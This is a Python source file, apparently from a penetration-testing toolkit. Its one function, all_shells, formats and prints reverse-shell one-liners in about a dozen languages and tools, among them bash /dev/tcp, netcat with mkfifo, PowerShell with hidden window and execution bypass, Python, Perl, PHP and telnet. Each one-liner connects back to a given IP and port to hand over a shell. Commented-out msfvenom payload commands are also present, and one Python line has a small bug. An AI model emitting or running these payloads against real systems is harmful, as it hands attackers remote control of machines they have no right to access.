from src.design import print_error, print_info, print_shell, bcolors

def all_shells(ip, port):
	bash = "bash -i >& /dev/tcp/"+bcolors.YELLOW+ip+bcolors.ENDC+"/"+bcolors.YELLOW+port+bcolors.ENDC+" 0>&1"
	bash2 = "0<&196;exec 196<>/dev/tcp/"+bcolors.YELLOW+ip+bcolors.ENDC+"/"+bcolors.YELLOW+port+bcolors.ENDC+"; sh <&196 >&196 2>&196"
	go = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial(\"tcp",\""""+bcolors.YELLOW+ip+bcolors.ENDC+""":"""+bcolors.YELLOW+port+bcolors.ENDC+"""\");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
	nc = """nc -e /bin/sh """+bcolors.YELLOW+ip+bcolors.ENDC+""" """+bcolors.YELLOW+port+bcolors.ENDC
	nc2 = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+bcolors.YELLOW+ip+bcolors.ENDC+""" """+bcolors.YELLOW+port+bcolors.ENDC+""" >/tmp/f"""
	nc3 = """touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc """+bcolors.YELLOW+ip+""" """+port+bcolors.ENDC+""" > /tmp/f"""
	ncatssl = """ncat --ssl -vv -l -p """+bcolors.YELLOW+port+bcolors.ENDC+"""\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \""""+bcolors.YELLOW+ip+bcolors.ENDC+""":"""+bcolors.YELLOW+port+bcolors.ENDC+"""\" > /tmp/s; rm /tmp/s"""
	#lin_sl = """msfvenom -p linux/x86/shell_reverse_tcp LHOST="""+bcolors.YELLOW+ip+bcolors.ENDC+""" LPORT="""+bcolors.YELLOW+port+bcolors.ENDC+""" -f elf >reverse.elf"""
	perl= """perl -e 'use Socket;$i=\"""" + bcolors.YELLOW+ip+bcolors.ENDC + """";$p="""+bcolors.YELLOW+port+bcolors.ENDC+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
	php = """php -r '$sock=fsockopen(\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+""");exec("/bin/sh <i <&3 >&3 2>&3");'"""
	php2 = """php -r '$sock=fsockopen(\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+""");$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
	powershell1 = """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
	powershell2 = """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'"""+bcolors.YELLOW+ip+bcolors.ENDC+"""\',"""+bcolors.YELLOW+port+bcolors.ENDC+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
	python = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno,2);p=subprocess.call(["/bin/sh","-i"]);'"""
	python2 = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
	ruby = """ruby -rsocket -e'f=TCPSocket.open(\""""+bcolors.YELLOW+ip+bcolors.ENDC+"""","""+bcolors.YELLOW+port+bcolors.ENDC+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f,f,f)'"""
	#win_sl = """msfvenom -p windows/shell_reverse_tcp LHOST="""+bcolors.YELLOW+ip+bcolors.ENDC+""" LPORT="""+bcolors.YELLOW+port+bcolors.ENDC+""" -f exe > reverse.exe"""
	xterm = """xterm -display """+bcolors.YELLOW+ip+bcolors.ENDC+""":"""+bcolors.YELLOW+port+bcolors.ENDC
	telnet = """TF=$(mktemp -u); mkfifo $TF && telnet """+bcolors.YELLOW+ip+""" 4444"""+bcolors.ENDC+""" 0<$TF | /bin/sh 1>$TF"""
	ksh = """ksh -c 'ksh -i > /dev/tcp/"""+bcolors.YELLOW+ip+bcolors.ENDC+"""/"""+bcolors.YELLOW+port+bcolors.ENDC+""" 2>&1 0>&1"""
	print("")

	spacers = ""
	spacers1 = spacers
	#spacers = "===="*30
	print(bcolors.YELLOW + spacers + bcolors.ENDC)
	print_shell("BASH:\n"+bcolors.ENDC +bash+ bcolors.RED + "\n" + bcolors.ENDC +bash2+"\n")

	print(bcolors.YELLOW + spacers + bcolors.ENDC)
	print_shell("GO:\n"+bcolors.ENDC +go+"\n")

	print(bcolors.YELLOW + spacers + bcolors.ENDC)
	print_shell("NETCAT:\n"+bcolors.ENDC +nc+ bcolors.RED + "\n" + bcolors.ENDC + nc2 + bcolors.RED + "\n" + bcolors.ENDC +ncatssl+"\n")

	#print(bcolors.YELLOW + spacers + bcolors.ENDC)
	#print_shell("MSFVENOM:\n"+bcolors.ENDC +lin_sl+bcolors.RED + "\n" + bcolors.ENDC +win_sl+"\n")

	print(bcolors.YELLOW + spacers + bcolors.ENDC)
	print_shell("PERL:\n"+bcolors.ENDC +perl+"\n")

	print(bcolors.YELLOW + spacers + bcolors.ENDC)
	print_shell("PHP:\n"+bcolors.ENDC +php+bcolors.RED + "\n" + bcolors.ENDC +php2+"\n")

	print(bcolors.YELLOW + spacers + bcolors.ENDC)
	print_shell("POWERSHELL:\n"+bcolors.ENDC +powershell1 + bcolors.RED + "\n"+spacers1+"\n" + bcolors.ENDC +powershell2+"\n")

	print(bcolors.YELLOW + spacers + bcolors.ENDC)
	print_shell("PYTHON:\n"+bcolors.ENDC +python+bcolors.RED + "\n"+spacers1+"\n" + bcolors.ENDC +python2+"\n")

	print(bcolors.YELLOW + spacers + bcolors.ENDC)
	print_shell("XTERM:\n"+bcolors.ENDC +xterm+"\n")

	print(bcolors.YELLOW + spacers + bcolors.ENDC)
	print_shell("TELNET:\n"+bcolors.ENDC + telnet +"\n")

	print(bcolors.YELLOW + spacers + bcolors.ENDC)
	print_shell("KSH:\n"+bcolors.ENDC + ksh +"\n")
